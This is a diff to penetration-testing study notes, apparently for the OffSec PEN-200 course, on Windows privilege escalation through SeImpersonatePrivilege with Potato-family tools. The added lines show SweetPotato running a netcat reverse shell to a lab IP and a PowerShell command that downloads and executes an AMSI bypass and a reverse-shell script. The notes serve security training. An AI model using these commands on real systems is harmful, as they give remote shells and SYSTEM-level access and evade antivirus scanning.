@@ -342,6 +342,12 @@ nt authority\system
 While PrintSpoofer provided us a straightforward exploit process to elevate our privileges, there are also other tools that can abuse _SeImpersonatePrivilege_ for privilege escalation. Variants from the _Potato_[9](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/abusing-other-windows-components/using-exploits#fn9) family (for example _RottenPotato_, _SweetPotato_, or _JuicyPotato_) are such tools. We should take the time to study these tools as they are an effective alternative to PrintSpoofer.
 	* USE **GODPOTATO** OR **SWEETPOTATO**
 
+Sweetpotato examples:
+```shell
+.\SweetPotato.exe -a "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.112.147 8081"
+./SweetPotato.exe -a "/c powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/Invoke-PowerShellTcp2.ps1')"
+```
+
 #### SAM, Security and System files
 
 With this files we can dump credentials using impacket-secretsdump. We can get this files if we are admins or maybe check for folders like windows.old and check there inside .\\Windows\\System32 folder
